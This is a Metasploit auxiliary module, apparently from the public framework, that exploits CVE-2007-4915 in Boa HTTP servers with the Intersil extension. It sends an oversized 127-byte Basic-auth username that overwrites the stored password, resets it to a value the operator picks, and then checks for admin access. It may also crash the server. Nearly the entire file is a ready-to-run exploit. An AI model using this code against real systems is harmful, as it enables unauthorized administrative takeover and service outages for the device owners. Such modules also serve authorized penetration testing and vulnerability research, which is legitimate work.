##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Intersil (Boa) HTTPd Basic Authentication Password Reset',
        'Description' => %q{
          The Intersil extension in the Boa HTTP Server 0.93.x - 0.94.11
          allows basic authentication bypass when the user string is greater
          than 127 bytes long.  The long string causes the password to be
          overwritten in memory, which enables the attacker to reset the
          password.  In addition, the malicious attempt also may cause a
          denial-of-service condition.

          Please note that you must set the request URI to the directory that
          requires basic authentication in order to work properly.
        },
        'Author' => [
          'Luca "ikki" Carettoni <luca.carettoni[at]securenetwork.it>', # original discoverer
          'Claudio "paper" Merloni <claudio.merloni[at]securenetwork.it>', # original discoverer
          'Max Dietz <maxwell.r.dietz[at]gmail.com>' # metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2007-4915' ],
          [ 'BID', '25676'],
          [ 'PACKETSTORM', '59347']
        ],
        'DisclosureDate' => '2007-09-10',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The request URI', '/']),
        OptString.new('PASSWORD', [true, 'The password to set', 'pass'])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'uri' => '/',
      'method' => 'GET'
    })

    if res && (m = res.headers['Server'].match(%r{Boa/(.*)}))
      vprint_status("Boa Version Detected: #{m[1]}")
      return Exploit::CheckCode::Safe if (m[1][0].ord - 48 > 0) # boa server wrong version
      return Exploit::CheckCode::Safe if (m[1][3].ord - 48 > 4)

      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe('Not a Boa Server!')
  rescue Rex::ConnectionRefused
    print_error('Connection refused by server.')
    return Exploit::CheckCode::Safe
  end

  def run
    return if check != Exploit::CheckCode::Vulnerable

    uri = normalize_uri(target_uri.path)
    uri << '/' if uri[-1, 1] != '/'

    res = send_request_cgi({
      'uri' => uri,
      'method' => 'GET',
      'authorization' => basic_auth(Rex::Text.rand_text_alpha(127), datastore['PASSWORD'])
    })

    if res.nil?
      print_error('The server may be down')
      return
    end

    if res.code != 401
      print_status("#{uri} does not have basic authentication enabled")
      return
    end

    print_status('Server still operational. Checking to see if password has been overwritten')
    res = send_request_cgi({
      'uri' => uri,
      'method' => 'GET',
      'authorization' => basic_auth('admin', datastore['PASSWORD'])
    })

    if !res
      print_error('Server timed out, will not continue')
      return
    end

    case res.code
    when 200
      print_good("Password reset successful with admin:#{datastore['PASSWORD']}")
    when 401
      print_error('Access forbidden. The password reset attempt did not work')
    else
      print_status("Unexpected response: Code #{res.code} encountered")
    end
  end
end
